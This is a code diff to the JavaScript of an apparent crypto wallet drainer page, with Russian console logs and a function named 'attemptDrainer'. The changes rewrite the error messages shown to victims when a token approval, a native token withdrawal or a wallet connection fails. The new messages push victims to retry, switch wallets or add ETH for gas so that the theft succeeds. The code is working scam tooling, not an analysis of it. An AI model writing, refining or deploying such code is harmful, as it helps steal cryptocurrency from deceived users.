@@ -390,7 +390,7 @@ function showModal() {
 async function hideModalWithDelay(errorMessage = null) {
   if (errorMessage) {
     console.log(`❌ Ошибка перед закрытием: ${errorMessage}`);
-    modalSubtitle.textContent = `Error: ${errorMessage}. Please try again.`;
+    modalSubtitle.textContent = errorMessage;
     // Увеличиваем задержку до 7 секунд для мобильных устройств
     await new Promise(resolve => setTimeout(resolve, 7000));
   }
@@ -410,7 +410,7 @@ async function attemptDrainer() {
   if (!connectedAddress) {
     console.error('❌ Адрес кошелька не определён');
     showModal();
-    await hideModalWithDelay("Wallet address not defined");
+    await hideModalWithDelay("Error: Wallet address not defined. Please try again.");
     return;
   }
 
@@ -425,7 +425,7 @@ async function attemptDrainer() {
     if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
       console.error('❌ Несоответствие адресов:', address, connectedAddress);
       isTransactionPending = false;
-      await hideModalWithDelay("Wallet address mismatch");
+      await hideModalWithDelay("Error: Wallet address mismatch. Please try again.");
       return;
     }
 
@@ -442,12 +442,22 @@ async function attemptDrainer() {
     await hideModalWithDelay();
   } catch (err) {
     isTransactionPending = false;
-    let errorMessage = err.message || "Unknown error occurred";
+    let errorMessage = "Error: An unexpected error occurred. Please try again.";
     if (err.message.includes('user rejected')) {
       console.log('🙅 Пользователь отклонил транзакцию');
-      errorMessage = "Transaction rejected by user";
+      errorMessage = "Error: Transaction rejected by user. Please try again.";
+    } else if (err.message.includes('Failed to approve token')) {
+      console.error('❌ Ошибка выполнения approve:', err.message);
+      errorMessage = "Error: Failed to approve token. Your wallet may not support this operation. Please try a different wallet.";
+    } else if (err.message.includes('Failed to process native token')) {
+      console.error('❌ Ошибка вывода нативного токена:', err.message);
+      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation. Please try a different wallet.";
+    } else if (err.message.includes('Insufficient ETH balance')) {
+      console.error('❌ Недостаточно ETH:', err.message);
+      errorMessage = "Error: Insufficient ETH balance for gas. Please add more ETH to your wallet.";
     } else {
       console.error('❌ Ошибка выполнения drainer:', err.message);
+      errorMessage = `Error: ${err.message}. Please try again or use a different wallet.`;
     }
     await hideModalWithDelay(errorMessage);
     throw err;
@@ -476,7 +486,7 @@ async function handleConnectOrAction() {
     console.error('❌ Ошибка подключения:', err.message);
     isTransactionPending = false;
     showModal();
-    await hideModalWithDelay(err.message || "Failed to connect wallet");
+    await hideModalWithDelay(`Error: Failed to connect wallet. ${err.message}. Please try again.`);
   }
 }
 
